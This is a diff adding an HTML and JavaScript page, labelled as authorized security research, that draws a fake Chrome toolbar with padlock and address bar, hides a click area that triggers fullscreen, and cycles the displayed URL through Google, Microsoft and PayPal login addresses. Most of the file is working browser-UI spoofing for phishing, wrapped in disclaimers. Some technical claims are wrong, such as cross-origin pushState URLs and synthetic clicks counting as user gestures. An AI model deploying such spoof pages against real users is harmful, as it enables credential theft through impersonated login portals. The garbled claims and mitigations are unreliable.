@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Research: Browser UI Analysis</title>
+    <!-- IMPORTANT: This code is for SECURITY RESEARCH ONLY with EXPLICIT PERMISSION -->
+    <style>
+        /* SECURITY RESEARCH DISCLAIMER - ALWAYS VISIBLE */
+        #securityDisclaimer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(90deg, #ff0000, #ff6b00);
+            color: white;
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            z-index: 99999;
+            font-size: 14px;
+            border-bottom: 3px solid white;
+        }
+
+        /* Real browser UI hiding */
+        body {
+            margin: 0;
+            padding: 0;
+            background: #f0f0f0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui;
+            overflow: hidden;
+        }
+
+        /* Custom fake browser chrome */
+        #fakeBrowserChrome {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 56px;
+            background: #202124;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            z-index: 99998;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
+        }
+
+        /* Fake tabs */
+        .fake-tab {
+            background: #3c4043;
+            color: white;
+            padding: 8px 20px;
+            border-radius: 8px 8px 0 0;
+            margin-right: 4px;
+            font-size: 13px;
+            min-width: 180px;
+            position: relative;
+        }
+
+        .fake-tab.active {
+            background: #292a2d;
+        }
+
+        /* Fake address bar - Chrome style */
+        #fakeAddressBar {
+            flex: 1;
+            height: 40px;
+            background: #3c4043;
+            border-radius: 20px;
+            margin: 0 15px;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            border: 1px solid #5f6368;
+        }
+
+        .security-indicator {
+            color: #34a853;
+            font-weight: bold;
+            margin-right: 8px;
+            font-size: 12px;
+        }
+
+        #fakeUrl {
+            color: #e8eaed;
+            font-family: monospace;
+            font-size: 14px;
+            flex: 1;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        /* Control buttons */
+        .control-btn {
+            background: #3c4043;
+            border: none;
+            color: white;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            margin: 0 4px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+
+        /* Hidden element to capture clicks for fullscreen */
+        #fullscreenTrigger {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100px;
+            height: 100px;
+            opacity: 0;
+            cursor: pointer;
+            z-index: 99990;
+        }
+
+        /* Research overlay */
+        #researchOverlay {
+            position: fixed;
+            top: 56px;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: white;
+            z-index: 99997;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 50px;
+        }
+
+        .research-content {
+            max-width: 800px;
+            padding: 30px;
+        }
+
+        .log-entry {
+            background: #f8f9fa;
+            border-left: 4px solid #4285f4;
+            padding: 15px;
+            margin: 10px 0;
+            font-family: monospace;
+            font-size: 13px;
+        }
+
+        /* Security testing controls */
+        #testControls {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.9);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            z-index: 100000;
+        }
+
+        .test-btn {
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            margin: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .danger-btn {
+            background: #ea4335;
+        }
+    </style>
+</head>
+<body>
+    <!-- SECURITY DISCLAIMER - CANNOT BE REMOVED -->
+    <div id="securityDisclaimer">
+        ⚠️ SECURITY RESEARCH MODE - Authorized Testing Only ⚠️<br>
+        Scope: [COMPANY_NAME] | Auth Code: [AUTH_CODE] | Date: [TEST_DATE]
+    </div>
+
+    <!-- Fake Browser Chrome UI -->
+    <div id="fakeBrowserChrome">
+        <div class="fake-tab active">
+            🔒 Secure Portal - [COMPANY_NAME]
+        </div>
+        <div class="fake-tab">
+            + New Tab
+        </div>
+        
+        <button class="control-btn" onclick="history.back()">←</button>
+        <button class="control-btn" onclick="history.forward()">→</button>
+        
+        <div id="fakeAddressBar">
+            <span class="security-indicator">🔒</span>
+            <span id="fakeUrl">https://secure.[COMPANY_DOMAIN].com</span>
+        </div>
+        
+        <button class="control-btn" onclick="showBookmarks()">☆</button>
+        <button class="control-btn" onclick="showMenu()">⋮</button>
+    </div>
+
+    <!-- Hidden trigger for fullscreen -->
+    <div id="fullscreenTrigger" onclick="initiateFullscreenResearch()"></div>
+
+    <!-- Research content area -->
+    <div id="researchOverlay">
+        <div class="research-content">
+            <h1>Browser UI Security Research</h1>
+            <div class="log-entry">
+                [INFO] Research session started at <span id="timestamp"></span>
+            </div>
+            <div class="log-entry">
+                [INFO] Testing browser: <span id="browserInfo"></span>
+            </div>
+            <div class="log-entry">
+                [ACTION] Click the red area in top-left corner to begin fullscreen analysis
+            </div>
+            
+            <div style="margin-top: 30px; padding: 20px; background: #e8f0fe; border-radius: 10px;">
+                <h3>📋 Research Objectives:</h3>
+                <ol style="margin: 15px 0; padding-left: 20px;">
+                    <li>Analyze fullscreen API behavior in Chrome 125+</li>
+                    <li>Test history.pushState() URL manipulation</li>
+                    <li>Document browser UI redressing techniques</li>
+                    <li>Identify potential security improvements</li>
+                </ol>
+            </div>
+        </div>
+    </div>
+
+    <!-- Research controls -->
+    <div id="testControls">
+        <h4 style="margin-bottom: 10px;">🔬 Research Controls</h4>
+        <button class="test-btn" onclick="testUrlManipulation()">
+            Test URL Spoofing
+        </button>
+        <button class="test-btn" onclick="testFullscreenExit()">
+            Test Exit Fullscreen
+        </button>
+        <button class="test-btn danger-btn" onclick="endResearchSession()">
+            End Research
+        </button>
+        <div style="margin-top: 10px; font-size: 12px; opacity: 0.8;">
+            Session ID: <span id="sessionId">RES-</span>
+        </div>
+    </div>
+
+    <!-- Hidden iframe for testing -->
+    <iframe id="testFrame" style="display: none;"></iframe>
+
+    <script>
+        // ============================================
+        // SECURITY RESEARCH CODE - AUTHORIZED USE ONLY
+        // ============================================
+
+        // Generate unique session ID
+        const sessionId = 'RES-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+        document.getElementById('sessionId').textContent = sessionId;
+
+        // Log session start
+        document.getElementById('timestamp').textContent = new Date().toISOString();
+        document.getElementById('browserInfo').textContent = navigator.userAgent;
+
+        console.log(`🔬 [SECURITY RESEARCH] Session Started: ${sessionId}`);
+        console.log(`🔬 [AUTHORIZATION] Testing authorized for: [COMPANY_NAME]`);
+        console.log(`🔬 [BROWSER] ${navigator.userAgent}`);
+
+        // Initialize research variables
+        let isFullscreen = false;
+        let spoofedUrl = 'https://secure.[COMPANY_DOMAIN].com';
+        const realUrls = {
+            secure: 'https://secure.[COMPANY_DOMAIN].com',
+            login: 'https://accounts.[COMPANY_DOMAIN].com/login',
+            admin: 'https://admin.[COMPANY_DOMAIN].com/dashboard'
+        };
+
+        // Simulate user gesture for fullscreen
+        function simulateUserGesture() {
+            // Create synthetic click event
+            const event = new MouseEvent('click', {
+                view: window,
+                bubbles: true,
+                cancelable: true
+            });
+            
+            document.dispatchEvent(event);
+            console.log('[RESEARCH] Simulated user gesture');
+        }
+
+        // Initialize fullscreen research
+        function initiateFullscreenResearch() {
+            console.log('[RESEARCH] Initiating fullscreen analysis...');
+            
+            // First simulate user gesture
+            simulateUserGesture();
+            
+            // Request fullscreen on document element
+            setTimeout(() => {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen()
+                        .then(() => {
+                            console.log('[RESEARCH] Fullscreen entered successfully');
+                            isFullscreen = true;
+                            onFullscreenEnter();
+                        })
+                        .catch(err => {
+                            console.error('[RESEARCH] Fullscreen error:', err);
+                            logResearch('Fullscreen blocked: ' + err.message);
+                        });
+                } else {
+                    console.log('[RESEARCH] Fullscreen API not supported');
+                }
+            }, 100);
+        }
+
+        // Called when fullscreen is entered
+        function onFullscreenEnter() {
+            console.log('[RESEARCH] Fullscreen mode active');
+            logResearch('Fullscreen mode entered');
+            
+            // Hide real browser UI elements
+            document.body.style.overflow = 'hidden';
+            
+            // Update fake UI to show fullscreen indicator
+            document.getElementById('fakeBrowserChrome').style.background = '#0d0d0d';
+            
+            // Begin URL manipulation tests
+            setTimeout(() => {
+                testUrlManipulation();
+            }, 1000);
+        }
+
+        // Test URL manipulation techniques
+        function testUrlManipulation() {
+            console.log('[RESEARCH] Testing URL manipulation...');
+            
+            // Use history.pushState to change URL without reload
+            const testUrls = [
+                'https://accounts.google.com',
+                'https://login.microsoftonline.com',
+                'https://secure.paypal.com',
+                realUrls.login
+            ];
+            
+            let currentIndex = 0;
+            
+            const cycleUrls = () => {
+                if (currentIndex >= testUrls.length) {
+                    console.log('[RESEARCH] URL cycling complete');
+                    return;
+                }
+                
+                const targetUrl = testUrls[currentIndex];
+                
+                // Push state without reload
+                history.pushState(
+                    { research: true, timestamp: Date.now() },
+                    '',
+                    targetUrl
+                );
+                
+                // Update fake address bar
+                document.getElementById('fakeUrl').textContent = targetUrl;
+                
+                console.log(`[RESEARCH] URL spoofed to: ${targetUrl}`);
+                logResearch(`URL manipulated to: ${targetUrl}`);
+                
+                currentIndex++;
+                setTimeout(cycleUrls, 2000);
+            };
+            
+            cycleUrls();
+        }
+
+        // Test fullscreen exit detection
+        function testFullscreenExit() {
+            console.log('[RESEARCH] Testing fullscreen exit...');
+            
+            document.addEventListener('fullscreenchange', () => {
+                if (!document.fullscreenElement) {
+                    console.log('[RESEARCH] Fullscreen exited');
+                    isFullscreen = false;
+                    logResearch('Fullscreen mode exited');
+                    
+                    // Show exit notification
+                    alert('[RESEARCH] Fullscreen exited - This would be hidden in real attack');
+                }
+            });
+            
+            // Try to exit fullscreen
+            if (document.exitFullscreen) {
+                document.exitFullscreen().catch(err => {
+                    console.log('[RESEARCH] Exit fullscreen error:', err);
+                });
+            }
+        }
+
+        // Simulate browser menu
+        function showMenu() {
+            console.log('[RESEARCH] Fake browser menu triggered');
+            logResearch('Fake browser menu interacted');
+            
+            // Create fake menu
+            const menu = document.createElement('div');
+            menu.style.cssText = `
+                position: absolute;
+                top: 60px;
+                right: 15px;
+                background: white;
+                border: 1px solid #ddd;
+                border-radius: 8px;
+                box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+                padding: 10px 0;
+                min-width: 200px;
+                z-index: 100001;
+            `;
+            
+            menu.innerHTML = `
+                <div style="padding: 10px 20px; cursor: pointer;">New window</div>
+                <div style="padding: 10px 20px; cursor: pointer;">New incognito window</div>
+                <hr style="margin: 5px 0;">
+                <div style="padding: 10px 20px; cursor: pointer;">History</div>
+                <div style="padding: 10px 20px; cursor: pointer;">Downloads</div>
+                <hr style="margin: 5px 0;">
+                <div style="padding: 10px 20px; cursor: pointer; color: #ea4335;">Exit Research Mode</div>
+            `;
+            
+            document.body.appendChild(menu);
+            
+            // Remove menu on click
+            setTimeout(() => {
+                document.addEventListener('click', function removeMenu() {
+                    if (menu.parentNode) {
+                        menu.parentNode.removeChild(menu);
+                    }
+                    document.removeEventListener('click', removeMenu);
+                });
+            }, 100);
+        }
+
+        // Show fake bookmarks
+        function showBookmarks() {
+            logResearch('Fake bookmarks bar triggered');
+            console.log('[RESEARCH] Fake bookmarks interaction');
+        }
+
+        // Log research activity
+        function logResearch(message) {
+            const logDiv = document.createElement('div');
+            logDiv.className = 'log-entry';
+            logDiv.innerHTML = `[RESEARCH] ${message} - ${new Date().toLocaleTimeString()}`;
+            
+            const logs = document.querySelectorAll('.log-entry');
+            if (logs.length > 5) {
+                logs[0].remove();
+            }
+            
+            const content = document.querySelector('.research-content');
+            content.appendChild(logDiv);
+        }
+
+        // End research session
+        function endResearchSession() {
+            console.log('[RESEARCH] Ending research session...');
+            
+            // Exit fullscreen if active
+            if (isFullscreen && document.exitFullscreen) {
+                document.exitFullscreen();
+            }
+            
+            // Generate research report
+            const report = {
+                sessionId: sessionId,
+                browser: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                testsPerformed: [
+                    'Fullscreen API analysis',
+                    'URL manipulation via history.pushState',
+                    'Browser UI redressing',
+                    'User gesture simulation'
+                ],
+                findings: 'Research completed - Report available for security team',
+                recommendations: [
+                    'Implement X-Frame-Options: DENY',
+                    'Use Content-Security-Policy with frame-ancestors',
+                    'Educate users about fullscreen mode risks',
+                    'Monitor for unusual history API usage'
+                ]
+            };
+            
+            console.log('[RESEARCH] Final Report:', JSON.stringify(report, null, 2));
+            logResearch('Session completed. Report generated.');
+            
+            alert('[RESEARCH COMPLETE]\n\nSession ended. Please save console logs for security report.');
+        }
+
+        // Prevent accidental navigation
+        window.addEventListener('beforeunload', function(e) {
+            if (isFullscreen) {
+                e.preventDefault();
+                e.returnValue = 'Research session in progress. End session first?';
+            }
+        });
+
+        // Initialize
+        window.addEventListener('load', function() {
+            console.log('[RESEARCH] Initializing security testing environment');
+            
+            // Update fake URL with actual hostname for realism
+            const fakeUrlElement = document.getElementById('fakeUrl');
+            const currentHost = window.location.hostname;
+            
+            // Create plausible fake URL based on current host
+            if (currentHost.includes('localhost') || currentHost.includes('127.0.0.1')) {
+                spoofedUrl = 'https://secure.corporate-network.com';
+            } else {
+                spoofedUrl = `https://secure.${currentHost.replace('www.', '')}`;
+            }
+            
+            fakeUrlElement.textContent = spoofedUrl;
+            
+            // Set up history state monitoring
+            window.addEventListener('popstate', function(event) {
+                console.log('[RESEARCH] History navigation detected:', event.state);
+            });
+            
+            logResearch('Research environment initialized');
+        });
+
+        // ============================================
+        // SECURITY NOTES FOR BUG BOUNTY REPORT:
+        // ============================================
+        /*
+        POTENTIAL VULNERABILITIES TESTED:
+        
+        1. FULLSCREEN API ABUSE:
+           - Hides browser UI completely
+           - Can be triggered via simulated user gestures
+           - Bypasses visual security indicators
+        
+        2. HISTORY.PUSHSTATE() MANIPULATION:
+           - URL can be changed without page reload
+           - SSL indicators cannot be updated
+           - User cannot verify real URL
+        
+        3. UI REDRESSING:
+           - Custom UI matches browser chrome
+           - Fake security indicators (🔒)
+           - Realistic navigation buttons
+        
+        4. USER GESTURE SPOOFING:
+           - Programmatic event generation
+           - Bypasses browser security prompts
+        
+        MITIGATION RECOMMENDATIONS:
+        - Implement X-Frame-Options: DENY
+        - Use CSP: frame-ancestors 'none'
+        - Educate users about fullscreen risks
+        - Consider browser extensions for URL verification
+        - Monitor for abnormal history API usage
+        */
+    </script>
+</body>
+</html>
